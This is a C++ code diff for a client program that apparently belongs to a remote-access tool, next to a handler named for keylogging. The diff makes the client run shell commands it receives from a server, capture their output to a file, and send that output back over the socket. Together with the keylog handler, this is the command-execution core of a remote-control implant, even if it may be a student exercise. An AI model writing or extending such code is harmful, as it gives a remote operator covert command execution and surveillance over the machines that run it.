@@ -245,9 +245,39 @@ void ClientApp::handleKeylogPacket(const LPTF_Packet& packet)
  */
 void ClientApp::handleExecCommandPacket(const LPTF_Packet& packet)
 {
+    std::cout << "[CLIENT DEBUG] Received EXEC_COMMAND packet from server.\n";
     std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
-    BashExec exec;
-    BashExec::executeToFile(cmd, "exec_output.txt");
+    std::cout << "[CLIENT DEBUG] Executing command: " << cmd << std::endl;
+
+    // Execute the command and write the output to exec_output.txt
+    if (!BashExec::executeToFile(cmd, "exec_output.txt"))
+    {
+        std::cerr << "[CLIENT ERROR] Failed to execute command: " << cmd << std::endl;
+        std::string err = "Échec de l'exécution de la commande: " + cmd;
+        std::vector<uint8_t> errPayload(err.begin(), err.end());
+        LPTF_Packet errorPacket(1, PacketType::RESPONSE, 0,
+                                packet.getPacketId(), packet.getSessionId(), errPayload);
+        socket->sendBinary(errorPacket.serialize());
+        return;
+    }
+
+    // Read the output file
+    std::ifstream in("exec_output.txt", std::ios::binary);
+    std::string output;
+    if (in) {
+        output.assign((std::istreambuf_iterator<char>(in)),
+                      std::istreambuf_iterator<char>());
+        in.close();
+    } else {
+        output = "Impossible de lire exec_output.txt";
+    }
+
+    // Send the result to the server
+    std::vector<uint8_t> payload(output.begin(), output.end());
+    LPTF_Packet responsePacket(1, PacketType::RESPONSE, 0,
+                               packet.getPacketId(), packet.getSessionId(), payload);
+    socket->sendBinary(responsePacket.serialize());
+    std::cout << "[CLIENT DEBUG] RESPONSE (exec output) packet sent.\n";
 }
 
 
